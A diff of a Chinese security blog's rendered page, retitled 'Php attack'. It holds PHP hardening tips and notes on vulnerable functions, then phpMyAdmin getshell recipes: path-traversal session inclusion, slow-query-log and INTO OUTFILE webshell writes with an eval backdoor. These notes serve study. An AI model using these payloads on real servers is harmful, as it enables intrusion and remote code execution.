@@ -13,7 +13,7 @@
         <meta name="description" content="Windforce17's blog">
       
       
-        <link rel="canonical" href="https://windforce17.github.io/blog/Web&Attack/phpmyadmin_getshell/">
+        <link rel="canonical" href="https://windforce17.github.io/blog/Web&Attack/php_attack/">
       
       
         <meta name="author" content="Windforce17">
@@ -42,7 +42,7 @@
     
     
       
-        <title>Phpmyadmin getshell - windforce17's blog</title>
+        <title>Php attack - windforce17's blog</title>
       
     
     
@@ -93,7 +93,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
-      <a href="#session" tabindex="1" class="md-skip">
+      <a href="#phpini" tabindex="1" class="md-skip">
         跳转至
       </a>
     
@@ -119,7 +119,7 @@
             </span>
             <span class="md-header-nav__topic">
               
-                Phpmyadmin getshell
+                Php attack
               
             </span>
           
@@ -208,7 +208,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../XSS SSRF/" title="Web&Attack" class="md-tabs__link md-tabs__link--active">
+        <a href="../SQL注入/" title="Web&Attack" class="md-tabs__link md-tabs__link--active">
           Web&Attack
         </a>
       
@@ -221,7 +221,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../coding/asm/" title="Coding" class="md-tabs__link">
+        <a href="../../coding/command/" title="Coding" class="md-tabs__link">
           Coding
         </a>
       
@@ -262,19 +262,6 @@
       
         <a href="../../keyAndSetting/各种Key/" title="keyAndSetting" class="md-tabs__link">
           keyAndSetting
-        </a>
-      
-    </li>
-  
-
-      
-        
-  
-  
-    <li class="md-tabs__item">
-      
-        <a href="../../shell/getshell/" title="Shell" class="md-tabs__link">
-          Shell
         </a>
       
     </li>
@@ -363,6 +350,18 @@
 
 
   <li class="md-nav__item">
+    <a href="../SQL注入/" title="SQL注入" class="md-nav__link">
+      SQL注入
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
     <a href="../XSS SSRF/" title="XSS SSRF" class="md-nav__link">
       XSS SSRF
     </a>
@@ -406,11 +405,11 @@
     
     
       <label class="md-nav__link md-nav__link--active" for="__toc">
-        Phpmyadmin getshell
+        Php attack
       </label>
     
-    <a href="./" title="Phpmyadmin getshell" class="md-nav__link md-nav__link--active">
-      Phpmyadmin getshell
+    <a href="./" title="Php attack" class="md-nav__link md-nav__link--active">
+      Php attack
     </a>
     
       
@@ -422,15 +421,139 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#session" title="本地session包含" class="md-nav__link">
-    本地session包含
+  <a href="#phpini" title="php.ini" class="md-nav__link">
+    php.ini
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#sqlgetishell" title="写入sql文件getishell" class="md-nav__link">
-    写入sql文件getishell
+  <a href="#_1" title="代码审计练习" class="md-nav__link">
+    代码审计练习
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phpmyadmin" title="phpmyadmin 密码修改" class="md-nav__link">
+    phpmyadmin 密码修改
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="序列化和反序列化" class="md-nav__link">
+    序列化和反序列化
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" title="变量覆盖漏洞" class="md-nav__link">
+    变量覆盖漏洞
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rce" title="RCE(远程代码执行)" class="md-nav__link">
+    RCE(远程代码执行)
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ereg" title="ereg()" class="md-nav__link">
+    ereg()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#preg_replace" title="preg_replace()" class="md-nav__link">
+    preg_replace()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="序列化与反序列化" class="md-nav__link">
+    序列化与反序列化
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#assert" title="assert()" class="md-nav__link">
+    assert()
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php7-bug" title="php7 直接崩溃bug" class="md-nav__link">
+    php7 直接崩溃bug
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phar" title="phar" class="md-nav__link">
+    phar
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phpmyadmin_1" title="phpmyadmin" class="md-nav__link">
+    phpmyadmin
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session" title="本地session包含" class="md-nav__link">
+    本地session包含
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getshell" title="文件包含getshell" class="md-nav__link">
+    文件包含getshell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getshell_1" title="日志getshell" class="md-nav__link">
+    日志getshell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell" title="文件写入shell" class="md-nav__link">
+    文件写入shell
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#think-php5x-rce" title="think php5.x RCE" class="md-nav__link">
+    think php5.x RCE
   </a>
   
 </li>
@@ -470,20 +593,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../web安全深度刨析/" title="Web安全深度刨析" class="md-nav__link">
-      Web安全深度刨析
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../wlan attack/" title="Wlan attack" class="md-nav__link">
-      Wlan attack
+    <a href="../wlan/" title="Wlan" class="md-nav__link">
+      Wlan
     </a>
   </li>
 
@@ -530,8 +641,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../提权/" title="提权" class="md-nav__link">
-      提权
+    <a href="../大型互联网企业入侵检测实战总结/" title="大型互联网企业入侵检测实战总结" class="md-nav__link">
+      大型互联网企业入侵检测实战总结
     </a>
   </li>
 
@@ -542,8 +653,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../漏洞扫描/" title="漏洞扫描" class="md-nav__link">
-      漏洞扫描
+    <a href="../提权和后门/" title="提权和后门" class="md-nav__link">
+      提权和后门
     </a>
   </li>
 
@@ -565,12 +676,19 @@
           
 
 
-  <li class="md-nav__item">
-    <a href="../绕过/" title="绕过" class="md-nav__link">
-      绕过
-    </a>
-  </li>
-
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-14" type="checkbox" id="nav-2-14">
+    
+    <label class="md-nav__link" for="nav-2-14">
+      Shell
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-14">
+        Shell
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
         
           
           
@@ -579,14 +697,14 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-15" type="checkbox" id="nav-2-15">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-14-1" type="checkbox" id="nav-2-14-1">
     
-    <label class="md-nav__link" for="nav-2-15">
-      SQL注入 绕过
+    <label class="md-nav__link" for="nav-2-14-1">
+      Php
     </label>
-    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-2-15">
-        SQL注入 绕过
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-14-1">
+        Php
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
         
@@ -597,57 +715,14 @@
 
 
   <li class="md-nav__item">
-    <a href="../SQL注入-绕过/SQL注入/" title="SQL注入" class="md-nav__link">
-      SQL注入
+    <a href="../shell/php/getshell/" title="Getshell" class="md-nav__link">
+      Getshell
     </a>
   </li>
 
         
       </ul>
     </nav>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-16" type="checkbox" id="nav-2-16">
-    
-    <label class="md-nav__link" for="nav-2-16">
-      入侵检测&审计
-    </label>
-    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-2-16">
-        入侵检测&审计
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../入侵检测&审计/php代码审计/" title="Php代码审计" class="md-nav__link">
-      Php代码审计
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../入侵检测&审计/大型互联网企业入侵检测实战总结/" title="大型互联网企业入侵检测实战总结" class="md-nav__link">
-      大型互联网企业入侵检测实战总结
-    </a>
   </li>
 
         
@@ -686,8 +761,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../../coding/asm/" title="Asm" class="md-nav__link">
-      Asm
+    <a href="../../coding/command/" title="python" class="md-nav__link">
+      python
     </a>
   </li>
 
@@ -770,18 +845,6 @@
 
 
   <li class="md-nav__item">
-    <a href="../../coding/math/" title="Math" class="md-nav__link">
-      Math
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
     <a href="../../coding/php/" title="Php" class="md-nav__link">
       Php
     </a>
@@ -829,27 +892,15 @@
           
 
 
-  <li class="md-nav__item">
-    <a href="../../coding/命令/" title="python" class="md-nav__link">
-      python
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-14" type="checkbox" id="nav-3-14">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-12" type="checkbox" id="nav-3-12">
     
-    <label class="md-nav__link" for="nav-3-14">
+    <label class="md-nav__link" for="nav-3-12">
       Internet
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-3-14">
+      <label class="md-nav__title" for="nav-3-12">
         Internet
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -879,17 +930,29 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-15" type="checkbox" id="nav-3-15">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-13" type="checkbox" id="nav-3-13">
     
-    <label class="md-nav__link" for="nav-3-15">
+    <label class="md-nav__link" for="nav-3-13">
       C&cpp
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-3-15">
+      <label class="md-nav__title" for="nav-3-13">
         C&cpp
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
         
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../coding/c&cpp/asm/" title="Asm" class="md-nav__link">
+      Asm
+    </a>
+  </li>
+
         
           
           
@@ -963,13 +1026,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-16" type="checkbox" id="nav-3-16">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-14" type="checkbox" id="nav-3-14">
     
-    <label class="md-nav__link" for="nav-3-16">
+    <label class="md-nav__link" for="nav-3-14">
       dataBase
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-3-16">
+      <label class="md-nav__title" for="nav-3-14">
         dataBase
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -1011,13 +1074,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-17" type="checkbox" id="nav-3-17">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-15" type="checkbox" id="nav-3-15">
     
-    <label class="md-nav__link" for="nav-3-17">
+    <label class="md-nav__link" for="nav-3-15">
       Golang
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-3-17">
+      <label class="md-nav__title" for="nav-3-15">
         Golang
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -1107,49 +1170,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-18" type="checkbox" id="nav-3-18">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-16" type="checkbox" id="nav-3-16">
     
-    <label class="md-nav__link" for="nav-3-18">
-      Javascript
-    </label>
-    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-3-18">
-        Javascript
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../coding/javascript/vue/" title="Vue" class="md-nav__link">
-      Vue
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-19" type="checkbox" id="nav-3-19">
-    
-    <label class="md-nav__link" for="nav-3-19">
+    <label class="md-nav__link" for="nav-3-16">
       Linux
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-3-19">
+      <label class="md-nav__title" for="nav-3-16">
         Linux
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -1234,13 +1261,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-19-7" type="checkbox" id="nav-3-19-7">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-16-7" type="checkbox" id="nav-3-16-7">
     
-    <label class="md-nav__link" for="nav-3-19-7">
+    <label class="md-nav__link" for="nav-3-16-7">
       Devops
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
-      <label class="md-nav__title" for="nav-3-19-7">
+      <label class="md-nav__title" for="nav-3-16-7">
         Devops
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -1347,13 +1374,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-20" type="checkbox" id="nav-3-20">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-17" type="checkbox" id="nav-3-17">
     
-    <label class="md-nav__link" for="nav-3-20">
+    <label class="md-nav__link" for="nav-3-17">
       macOS
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-3-20">
+      <label class="md-nav__title" for="nav-3-17">
         macOS
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -1395,13 +1422,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-21" type="checkbox" id="nav-3-21">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-18" type="checkbox" id="nav-3-18">
     
-    <label class="md-nav__link" for="nav-3-21">
+    <label class="md-nav__link" for="nav-3-18">
       Python
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-3-21">
+      <label class="md-nav__title" for="nav-3-18">
         Python
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -1415,6 +1442,18 @@
   <li class="md-nav__item">
     <a href="../../coding/python/DjangoStudy/" title="Django学习" class="md-nav__link">
       Django学习
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../coding/python/math/" title="Math" class="md-nav__link">
+      Math
     </a>
   </li>
 
@@ -1443,13 +1482,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-22" type="checkbox" id="nav-3-22">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-19" type="checkbox" id="nav-3-19">
     
-    <label class="md-nav__link" for="nav-3-22">
+    <label class="md-nav__link" for="nav-3-19">
       Win
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-3-22">
+      <label class="md-nav__title" for="nav-3-19">
         Win
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -1461,8 +1500,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../../coding/win/win ctl/" title="win some command" class="md-nav__link">
-      win some command
+    <a href="../../coding/win/win ctl/" title="Win ctl" class="md-nav__link">
+      Win ctl
     </a>
   </li>
 
@@ -1479,13 +1518,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-23" type="checkbox" id="nav-3-23">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-20" type="checkbox" id="nav-3-20">
     
-    <label class="md-nav__link" for="nav-3-23">
+    <label class="md-nav__link" for="nav-3-20">
       前端♂js
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-3-23">
+      <label class="md-nav__title" for="nav-3-20">
         前端♂js
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -1587,13 +1626,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-24" type="checkbox" id="nav-3-24">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-21" type="checkbox" id="nav-3-21">
     
-    <label class="md-nav__link" for="nav-3-24">
+    <label class="md-nav__link" for="nav-3-21">
       编译原理
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-3-24">
+      <label class="md-nav__title" for="nav-3-21">
         编译原理
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -2217,18 +2256,6 @@
 
 
   <li class="md-nav__item">
-    <a href="../../ctf/web/basic/" title="Basic" class="md-nav__link">
-      Basic
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
     <a href="../../ctf/web/escape/" title="Escape" class="md-nav__link">
       Escape
     </a>
@@ -2255,18 +2282,6 @@
   <li class="md-nav__item">
     <a href="../../ctf/web/python/" title="Python" class="md-nav__link">
       Python
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../ctf/web/thinkphp/" title="Thinkphp" class="md-nav__link">
-      Thinkphp
     </a>
   </li>
 
@@ -2473,66 +2488,6 @@
   </li>
 
     
-      
-      
-      
-
-
-  <li class="md-nav__item md-nav__item--nested">
-    
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
-    
-    <label class="md-nav__link" for="nav-7">
-      Shell
-    </label>
-    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
-      <label class="md-nav__title" for="nav-7">
-        Shell
-      </label>
-      <ul class="md-nav__list" data-md-scrollfix>
-        
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../shell/getshell/" title="Getshell" class="md-nav__link">
-      Getshell
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../shell/phar/" title="Phar" class="md-nav__link">
-      Phar
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../shell/phpmyadmin/" title="Phpmyadmin" class="md-nav__link">
-      Phpmyadmin
-    </a>
-  </li>
-
-        
-      </ul>
-    </nav>
-  </li>
-
-    
   </ul>
 </nav>
                   </div>
@@ -2552,15 +2507,139 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#session" title="本地session包含" class="md-nav__link">
-    本地session包含
+  <a href="#phpini" title="php.ini" class="md-nav__link">
+    php.ini
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#sqlgetishell" title="写入sql文件getishell" class="md-nav__link">
-    写入sql文件getishell
+  <a href="#_1" title="代码审计练习" class="md-nav__link">
+    代码审计练习
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phpmyadmin" title="phpmyadmin 密码修改" class="md-nav__link">
+    phpmyadmin 密码修改
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="序列化和反序列化" class="md-nav__link">
+    序列化和反序列化
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" title="变量覆盖漏洞" class="md-nav__link">
+    变量覆盖漏洞
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rce" title="RCE(远程代码执行)" class="md-nav__link">
+    RCE(远程代码执行)
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ereg" title="ereg()" class="md-nav__link">
+    ereg()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#preg_replace" title="preg_replace()" class="md-nav__link">
+    preg_replace()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="序列化与反序列化" class="md-nav__link">
+    序列化与反序列化
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#assert" title="assert()" class="md-nav__link">
+    assert()
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php7-bug" title="php7 直接崩溃bug" class="md-nav__link">
+    php7 直接崩溃bug
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phar" title="phar" class="md-nav__link">
+    phar
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#phpmyadmin_1" title="phpmyadmin" class="md-nav__link">
+    phpmyadmin
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session" title="本地session包含" class="md-nav__link">
+    本地session包含
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getshell" title="文件包含getshell" class="md-nav__link">
+    文件包含getshell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getshell_1" title="日志getshell" class="md-nav__link">
+    日志getshell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell" title="文件写入shell" class="md-nav__link">
+    文件写入shell
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#think-php5x-rce" title="think php5.x RCE" class="md-nav__link">
+    think php5.x RCE
   </a>
   
 </li>
@@ -2587,22 +2666,96 @@
             <article class="md-content__inner md-typeset">
               
                 
-                  <a href="https://github.com/Windforce17/blog/blob/master/docs/Web&Attack/phpmyadmin_getshell.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                  <a href="https://github.com/Windforce17/blog/blob/master/docs/Web&Attack/php_attack.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                  <h1>Phpmyadmin getshell</h1>
+                  <h1>Php attack</h1>
                 
-                <h2 id="session">本地session包含<a class="headerlink" href="#session" title="Permanent link">&para;</a></h2>
+                <h2 id="phpini">php.ini<a class="headerlink" href="#phpini" title="Permanent link">&para;</a></h2>
+<p>php.ini并放置在httpd.conf中PHPIniDir指定的目录，使用phpinfo()函数可以查看</p>
+<div class="codehilite"><pre><span></span><span class="na">safe_mode</span> <span class="o">=</span> <span class="s">off 避免各种奇怪的失败</span>
+<span class="na">register_globals 关闭</span>
+<span class="na">open_basedir 配置， 防止目录遍历</span>
+<span class="na">allow_url_fopen 关闭 文件打开限制</span>
+<span class="na">display_error</span> <span class="o">=</span><span class="s">off 避免攻击者获取更多信息</span>
+<span class="na">expose_php</span> <span class="o">=</span> <span class="s">off 隐藏版本信息</span>
+</pre></div>
+
+<h2 id="_1">代码审计练习<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><a href="https://github.com/hongriSec/PHP-Audit-Labs">https://github.com/hongriSec/PHP-Audit-Labs</a></p>
+<p>两款代码审计工具 seay ,RIPS</p>
+<h2 id="phpmyadmin">phpmyadmin 密码修改<a class="headerlink" href="#phpmyadmin" title="Permanent link">&para;</a></h2>
+<ol>
+<li>更改用户中的密码</li>
+<li><code>config.inc.php</code>中password修改</li>
+</ol>
+<h2 id="_2">序列化和反序列化<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>CVE-2016-7124</p>
+<h2 id="_3">变量覆盖漏洞<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击 变量覆盖漏洞大多数由函数使用不当导致，经常引发变量覆盖漏洞的函数有：extract(),parse_str()和import_request_variables()</p>
+<h2 id="rce">RCE(远程代码执行)<a class="headerlink" href="#rce" title="Permanent link">&para;</a></h2>
+<p>命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。
+<div class="codehilite"><pre><span></span><span class="x">System() //有回显</span>
+<span class="x">exec() //无回显</span>
+<span class="x">shell_exec() //无回显</span>
+<span class="x">passthru() //有回显</span>
+</pre></div></p>
+<h3 id="ereg">ereg()<a class="headerlink" href="#ereg" title="Permanent link">&para;</a></h3>
+<p>出现%00 则只检查%00前面的字符串</p>
+<h3 id="preg_replace">preg_replace()<a class="headerlink" href="#preg_replace" title="Permanent link">&para;</a></h3>
+<p>正则表达式替换，第一个参数/e结束时，会将第二个参数当成代码执行</p>
+<h3 id="_4">序列化与反序列化<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>unserialize 会调用__wakeup 函数</p>
+<h3 id="assert">assert()<a class="headerlink" href="#assert" title="Permanent link">&para;</a></h3>
+<p>当第一参数是字符串时，执行字符串代码</p>
+<h2 id="php7-bug">php7 直接崩溃bug<a class="headerlink" href="#php7-bug" title="Permanent link">&para;</a></h2>
+<p><code>include(‘php://filter/string.strip_tags/resource=/etc/passwd’)</code></p>
+<h2 id="phar">phar<a class="headerlink" href="#phar" title="Permanent link">&para;</a></h2>
+<p>TODO:
+<a href="https://blog.csdn.net/ru_li/article/details/51452488">https://blog.csdn.net/ru_li/article/details/51452488</a>
+<a href="http://www.vuln.cn/2035">http://www.vuln.cn/2035</a>
+<a href="http://www.webhek.com/post/packaging-your-php-apps-with-phar.html">http://www.webhek.com/post/packaging-your-php-apps-with-phar.html</a></p>
+<h2 id="phpmyadmin_1">phpmyadmin<a class="headerlink" href="#phpmyadmin_1" title="Permanent link">&para;</a></h2>
+<h3 id="session">本地session包含<a class="headerlink" href="#session" title="Permanent link">&para;</a></h3>
 <ol>
 <li>root登录，执行 <code>select '&lt;?php phpinfo();exit;?&gt;'</code></li>
 <li>找到phpmyadmin cookie，<code>/index.php?target=db_sql.php%253f/../../var/lib/php/sessions/&lt;you cookie&gt;</code></li>
 </ol>
-<h2 id="sqlgetishell">写入sql文件getishell<a class="headerlink" href="#sqlgetishell" title="Permanent link">&para;</a></h2>
-<ol>
-<li>test数据库下新建表，字段名<code>&lt;?php phpinfo()?&gt;</code></li>
-<li>查看sql文件路径<code>show variables like '%datadir%'</code></li>
-<li>getshll <code>/index.php?target=db_sql.php%253f/../../var/lib/mysql/test/hy.frm</code></li>
-</ol>
+<h3 id="getshell">文件包含getshell<a class="headerlink" href="#getshell" title="Permanent link">&para;</a></h3>
+<p>获取web绝对路径(<code>select @@basedir;</code>)</p>
+<h3 id="getshell_1">日志getshell<a class="headerlink" href="#getshell_1" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><span class="k">set</span> <span class="k">global</span> <span class="n">slow_query_log</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="c1">--开启慢查询日志</span>
+<span class="k">show</span> <span class="k">global</span> <span class="n">variables</span> <span class="k">like</span> <span class="s1">&#39;%long_query_time%&#39;</span>
+<span class="o">#</span> <span class="err">默认</span><span class="mi">10</span><span class="err">秒</span>
+
+<span class="k">set</span> <span class="k">global</span> <span class="n">slow_query_log_file</span><span class="o">=</span><span class="s1">&#39;dir\filename&#39;</span><span class="p">;</span>
+<span class="k">select</span> <span class="s1">&#39;&lt;?php phpinfo();?&gt;&#39;</span> <span class="k">or</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">11</span><span class="p">);</span>
+</pre></div>
+
+<h3 id="shell">文件写入shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h3>
+<p>方法一：
+<div class="codehilite"><pre><span></span><span class="k">SHOW</span> <span class="n">VARIABLES</span> <span class="k">LIKE</span> <span class="s1">&#39;%secure_file_priv%&#39;</span><span class="p">;</span> 
+<span class="o">#</span> <span class="err">结果为</span><span class="n">null时无法写入文件</span>
+<span class="k">select</span> <span class="s1">&#39;&lt;?php @eval_r($_POST[cmd])?&gt;&#39;</span><span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="s1">&#39;网站目录路径/eval.php&#39;</span>
+</pre></div>
+方法二：
+1. test数据库下新建表，字段名<code>&lt;?php phpinfo()?&gt;</code>
+2. 查看sql文件路径<code>show variables like '%datadir%'</code>
+3. getshell <code>/index.php?target=db_sql.php%253f/../../var/lib/mysql/test/hy.frm</code></p>
+<h2 id="think-php5x-rce">think php5.x RCE<a class="headerlink" href="#think-php5x-rce" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span>https://learnku.com/articles/21227  
